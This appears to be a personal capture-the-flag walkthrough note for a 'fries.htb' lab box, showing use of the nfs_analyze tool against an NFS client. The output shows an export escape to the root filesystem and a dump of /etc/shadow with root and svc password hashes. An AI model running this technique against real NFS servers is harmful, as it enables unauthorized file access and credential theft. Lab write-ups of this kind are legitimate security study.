You already have a tunnel.

## nfs-security-tooling

There are two tools you have to use: *nfs_analyze* and *fuse_nfs*.

Use these tools to detect common misconfigurations on NFS servers that allow access to files outside the exported directories and privilege escalation.

For more info about installing and using the tools, visit the github repository.

> [!Important]
> After installing the tools you have to modife fuse_nfs.py.
> 

![[modify_fuse_nfs.png]]

URL:  https://github.com/hvs-consulting/nfs-security-tooling

#Attacking_machine 
After installing the tools on your attacking machine run the following code:

```
nfs_analyze 192.168.100.2 --check-no-root-squash
```

192.168.100.2 is one of the clients connected to the server. [[Escalate user svc_infra#Lists clients connected to the server]]

```
Checking host 192.168.100.2
Supported protocol versions reported by portmap:
Protocol          Versions  
portmap           2, 3, 4   
mountd            1, 2, 3   
status monitor 2  1         
nfs               3, 4      
nfs acl           3         
nfs lock manager  1, 3, 4   

Available Exports reported by mountd:
Directory           Allowed clients  Auth methods  Export file handle                                        
/srv/web.fries.htb  *(wildcard)      sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  

Connected clients reported by mountd:
Client               Export              
192.168.100.2(down)  /srv/web.fries.htb  

Supported NFS versions reported by nfsd:
Version  Supported  
3        Yes        
4.0      Yes        
4.1      Yes        
4.2      Yes        

NFSv3 Windows File Handle Signing: OK, server probably not Windows, File Handle not 32 bytes long

Trying to escape exports
Export: /srv/web.fries.htb: file system type ext/xfs, parent: None, 655363
Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found media tmp dev var .bash_history .. swap.img srv home libx32 bin root usr . sbin lib32 opt boot run
Root file handle: 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000

GID of shadow group: 42
Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB20J4yPWwAJxndkOA4zzrn5/Udv4BF9LbLq/:20239:0:99999:7:::
daemon:*:19579:0:99999:7:::                                                                                                                               
bin:*:19579:0:99999:7:::                                                                                                                                  
sys:*:19579:0:99999:7:::                                                                                                                                  
sync:*:19579:0:99999:7:::                                                                                                                                 
games:*:19579:0:99999:7:::                                                                                                                                
man:*:19579:0:99999:7:::                                                                                                                                  
lp:*:19579:0:99999:7:::                                                                                                                                   
mail:*:19579:0:99999:7:::                                                                                                                                 
news:*:19579:0:99999:7:::                                                                                                                                 
uucp:*:19579:0:99999:7:::                                                                                                                                 
proxy:*:19579:0:99999:7:::                                                                                                                                
www-data:*:19579:0:99999:7:::                                                                                                                             
backup:*:19579:0:99999:7:::                                                                                                                               
list:*:19579:0:99999:7:::                                                                                                                                 
irc:*:19579:0:99999:7:::                                                                                                                                  
gnats:*:19579:0:99999:7:::                                                                                                                                
nobody:*:19579:0:99999:7:::                                                                                                                               
_apt:*:19579:0:99999:7:::                                                                                                                                 
systemd-network:*:19579:0:99999:7:::                                                                                                                      
systemd-resolve:*:19579:0:99999:7:::                                                                                                                      
messagebus:*:19579:0:99999:7:::                                                                                                                           
systemd-timesync:*:19579:0:99999:7:::                                                                                                                     
pollinate:*:19579:0:99999:7:::                                                                                                                            
sshd:*:19579:0:99999:7:::                                                                                                                                 
syslog:*:19579:0:99999:7:::                                                                                                                               
uuidd:*:19579:0:99999:7:::                                                                                                                                
tcpdump:*:19579:0:99999:7:::                                                                                                                              
tss:*:19579:0:99999:7:::                                                                                                                                  
landscape:*:19579:0:99999:7:::                                                                                                                            
fwupd-refresh:*:19579:0:99999:7:::                                                                                                                        
usbmux:*:19589:0:99999:7:::                                                                                                                               
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9V0PZ.BIyZKSGR6WFJWlxIRiqK.JLOB4PD:20238:0:99999:7:::                                                          
lxd:!:19589::::::                                                                                                                                         
_rpc:*:20234:0:99999:7:::                                                                                                                                 
statd:*:20234:0:99999:7:::                                                                                                                                
dnsmasq:*:20234:0:99999:7:::                                                                                                                              
barman:*:20236:0:99999:7:::                                                                                                                               
sssd:*:20238:0:99999:7:::                                                                                                                                 
                                                                                                                                                          
Checking no_root_squash
Export              no_root_squash  
/srv/web.fries.htb  DISABLED        

NFSv4 overview and auth methods (incomplete)
srv: pseudo
    web.fries.htb: sys
        shared: sys
        certs: sys
        webroot: sys

NFSv4 guessed exports (Linux only, may differ from /etc/exports):
Directory           Auth methods  Export file handle                                        
/srv/web.fries.htb  sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  


Trying to guess server OS
OS       Property                                      Fulfilled  
Linux    File Handles start with 0x0100                Yes        
Windows  NFSv3 File handles are 32 bytes long          No         
Windows  Only NFS versions 3 and 4.1 supported         No         
FreeBSD  Mountd reports subnets without mask           Unknown    
NetApp   netapp partner protocol supported             No         
HP-UX    Only one request per TCP connection possible  No         

Final OS guess: Linux

```

**Next step:** [[Mounting client]]
